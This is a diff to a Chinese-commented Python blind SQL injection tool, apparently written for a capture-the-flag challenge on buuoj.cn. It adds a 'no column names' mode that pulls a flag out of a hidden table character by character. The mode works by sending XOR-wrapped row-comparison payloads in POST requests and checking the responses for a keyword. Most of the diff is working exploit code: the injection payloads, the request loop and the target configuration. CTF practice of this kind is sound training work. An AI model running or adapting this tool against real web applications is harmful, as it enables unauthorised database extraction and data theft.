@@ -39,6 +39,8 @@ def main(theUrl,method,theReqMethod="get",theCheckMethod="textA",theKeyString=""
         binarySearch()
     elif(method=="cs"):
         characterSet(setNum)
+    elif(method=="nc"):
+        NoColumns(setNum)
     else:
         print("[+]Invalid ethod")
         exit()
@@ -91,13 +93,8 @@ def binarySearch(thePrv=32,theLast=126):
 
 def characterSet(setNum=1):
     #setNum为将使用的字符集
-    charSet={
-    1:string.ascii_letters+string.digits,     #大小写26字母+数字
-    2:string.digits+"abcdef",     #flag字符&16进制小写字符
-    3:"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",       #除开单双引号的标点字符
-    4:string.ascii_letters+string.digits+"!#$%&()*+,-./:;<=>?@[\]^_`{|}~"   #所有除开单双引号可见字符
-    }
-    targetCharSet=charSet[setNum]
+    #字母集存储在getCharacterSet函数中
+    targetCharSet=getCharacterSet(setNum)
     result=""
     endFlag=False
     for num in range(1,length):
@@ -116,14 +113,57 @@ def characterSet(setNum=1):
                 break
     print("[+]The full result:{}".format(result))
 
-def req(num,char="",sympol="",code=0):
-    #num为当前字段的第几位
-    #char为猜测的字符,仅cs提供
+def NoColumns(setNum):
+    #用nc前需要把除了测试字段外其余字段值整出来
+    #目前依据[GYCTF2020]Ezsqli构造的这个方法
+    #sympol用小于号也行没啥区别
+    targetCharSet=getCharacterSet(setNum)
+    result="flag{f10eb2b6-2ce3-45db-bcef-77829"
+    sympol=">"
+    endFlag=False
+    for num in range(1,length):
+        if endFlag:
+            print("[+]Match Finished!")
+            break
+        for char in targetCharSet:
+            print("[+]Testing:{}=>{}".format(num,char))
+            checkMin=req(char=result+char+"!",sympol=sympol)
+            checkMax=req(char=result+char+"~",sympol=sympol)
+            checkEqual=req(char=result+char,num=num,sympol="=")
+            checkFlag=checkMax^checkMin
+            print("[+]min:{} ^ max:{} => flag:{}".format(checkMin,checkMax,checkFlag))
+            if checkFlag or checkEqual:
+                result+=char
+                print("[+]Matched!Now result:{}".format(result))
+                print("[+]equal:{}".format(checkEqual))
+                if checkEqual:
+                    endFlag=True
+                break
+            elif char==targetCharSet[len(targetCharSet)-1:]:
+                endFlag=True
+                break
+    print("[+]The full result:{}".format(result))
+
+def getCharacterSet(num):
+    charSet={
+        1:string.ascii_letters+string.digits,     #大小写26字母+数字
+        2:string.digits+"abcdef"+"{}-",     #flag字符
+        3:"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",       #除开单双引号的标点字符
+        4:string.ascii_letters+string.digits+"!#$%&()*+,-./:;<=>?@[\]^_`{|}~",   #所有除开单双引号可见字符
+        5:string.ascii_lowercase+"0123456789"+"{}_@%,.<>=-"    #感觉可能用的最多的
+    }
+    return charSet[num]
+
+
+def req(num=0,char="",sympol="",code=0):
+    #num为当前字段的第几位,cs和bs均提供
+    #char为猜测的字符,cs和nc提供,注意nc提供的char携带额外1位(共两位)字符辅助判断
     #code为猜测的字符的ascii值,仅bs提供
-    #sympol为二分使用的判断符号,仅bs提供
+    #sympol为二分使用的判断符号,bs和nc提供
     #综上
     # bs : num code sympol
     # cs : num char
+    # nc : char sympol
     timeOutFlag=False
     httpReq=False
     if(checkMethod[:4]=="time"):
@@ -151,7 +191,8 @@ def req(num,char="",sympol="",code=0):
             #在这里构造post数据
             data={
                 #"id":'1^(select(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema=database())),{},1)){}{}))^1'.format(num,sympol,code)
-                "id":'1^(select(ascii(substr((select(f1ag)from(f1ag_1s_h3r3_hhhhh)),{},1)){}{}))^1'
+                #"id":'1^(select(ascii(substr((select(f1ag)from(f1ag_1s_h3r3_hhhhh)),{},1)){}{}))^1'
+                "id":'1^(select((select 1,"{}"){}(select * from f1ag_1s_h3r3_hhhhh)))^1'.format(char,sympol)
             }   
             #print(data)
             httpReq=getattr(res,reqMethod)(url=url,data=data,headers=header,cookies=cookie,timeout=timeOut)
@@ -210,25 +251,27 @@ if __name__ == '__main__' :
     #[5]bs方法有两个实现方法,可以自行选择(bs模式时才需要)
     '''
     url             具体提交数据的页面的URL
-    method          盲注的方法,有bs代表的二分法和cs代表的字符集两种
+    method          盲注的方法,有bs代表的二分法、cs代表的字符集、nc代表的无列名三种
     theCheckMethod  检查方式textX和timeX两种(前4字母代表主方式,最后X代表次方式)
                     X可以为A代表关键字B代表检测图片
                     X为纯数字代表超时时间(可以写小数)
                     默认为textA
                     添了个没写的else
-    setNum          cs方式用的字数集序号,默认为1,cs模式时需要考虑
+    setNum          cs或nc方式用的字数集序号,默认为1,采用cs或nc方式时需要考虑
     theReqMethod    请求方式,get和post两种,默认为GET
     theKeyString    用来判断的关键字,默认为空需要自己传入 
     theLength       设置字段的最大长度,默认为32
     sleep           每次请求后的睡眠时间,防止429,默认0.3秒
     '''
-    url="http://67617c59-3e41-469d-bd99-b57ea24ea4ac.node4.buuoj.cn:81/index.php"
-    method="bs"
+    url="http://f1dbd963-b5be-469d-9489-d847a6739e23.node4.buuoj.cn:81/index.php"
+    method="nc"
     theCheckMethod="textA"
     length=50
     theReqMethod="post"
     theKeyString="Nu1L"
-    main(theUrl=url,method=method,theCheckMethod=theCheckMethod,theLength=length,theReqMethod=theReqMethod,theKeyString=theKeyString)
+    setNum=2
+    sleep=0.5
+    main(theUrl=url,method=method,theCheckMethod=theCheckMethod,theLength=length,theReqMethod=theReqMethod,theKeyString=theKeyString,setNum=setNum,theSleep=sleep)
     #setNum=0
     #theReqMethod=''
     #theKeyString=""
